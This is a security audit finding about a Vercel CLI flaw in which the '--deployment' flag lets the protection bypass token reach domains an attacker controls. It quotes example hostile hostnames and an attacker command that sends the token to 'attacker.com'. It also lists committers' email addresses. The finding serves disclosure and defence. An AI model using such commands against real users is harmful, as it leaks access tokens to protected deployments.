# [MEDIUM] Protection bypass token leaked to attacker-controlled domains via --deployment flag

**File:** [`packages/cli/src/commands/curl/deployment-url.ts`](https://github.com/vercel/vercel/blob/melkey/bun-working-branch/blob/melkey/packages/cli/src/commands/curl/deployment-url.ts#L13-L27) (lines 13, 14, 17, 19, 26, 27)
**Project:** vercel
**Severity:** MEDIUM  •  **Confidence:** high  •  **Slug:** `other-token-leak-via-unvalidated-url`

## Owners

**Suggested assignee:** `tom.knickman@vercel.com` _(via last-committer)_

## Finding

getDeploymentUrlById() trusts user-supplied URLs without validating they belong to a Vercel domain or to the linked project. Three problematic paths exist:

1. L13–24: When the input starts with http:// or https://, the function calls `new URL(...)` and returns `url.origin` unchanged. This means a user can pass `--deployment https://attacker.example.com` and the CLI will use that as the base URL.

2. L26–28: The `includes('vercel.app')` check is a substring match, not a hostname check. It accepts:
   - `vercel.app.evil.com` (subdomain trick)
   - `evil-vercel.app` (typosquat)
   - `myproject.vercel.app@evil.com` (URL userinfo attack — `new URL` would parse host as evil.com on the http(s)-prefixed path, but here the substring check is used directly with `https://${input}`)
   - any hostname containing the literal string

3. The result flows back into shared.ts:201–214 where the user-controlled `baseUrl` is concatenated with the path, then index.ts:38–43 sets the `x-vercel-protection-bypass: <token>` header for the request to that URL. The token is auto-fetched/auto-created from the LINKED project (bypass-token.ts:114–119) without verifying that the target host belongs to that project.

Attack scenario: A user is socially engineered (typosquatted README, copy-paste from a malicious tutorial, etc.) into running `vercel curl /api/status --deployment https://my-app.vercel.app.attacker.com` (or just `--deployment https://attacker.com`). The CLI auto-creates/uses the project's automation bypass secret and sends it as a header to attacker.com. The attacker now possesses a valid `x-vercel-protection-bypass` token and can access protected (preview/production) deployments of the victim's project. Worse, when no bypass exists, the CLI silently CREATES a new bypass secret (bypass-token.ts:11–71) and leaks it on first use.

This is a token-binding violation: the bypass token is scoped to a specific Vercel project but the CLI sends it to any host the user names. Defense-in-depth requires hostname validation against an allowlist (`*.vercel.app`, `*.vercel.sh`, the project's verified custom domains) or against the linked project's known aliases/deployment URLs.

## Recommendation

Validate that user-supplied URLs in --deployment have a hostname ending in `.vercel.app` / `.vercel.sh` or matching one of the linked project's verified domains. Use proper hostname parsing (e.g., `new URL(input).hostname.endsWith('.vercel.app')`) instead of `String.includes('vercel.app')`. When --deployment is a non-Vercel URL, refuse to attach the protection bypass header (or refuse the request entirely). When the URL parser yields userinfo (e.g., `host@otherhost`), reject the input. Consider also requiring an explicit confirmation flag for cross-domain targeting.

## Recent committers (`git log`)

- Thomas Knickman <tom.knickman@vercel.com> (2026-03-04)
- Dimitri Mitropoulos <dimitrimitropoulos@gmail.com> (2025-11-18)
- Jeff See <jeffsee.55@gmail.com> (2025-11-10)
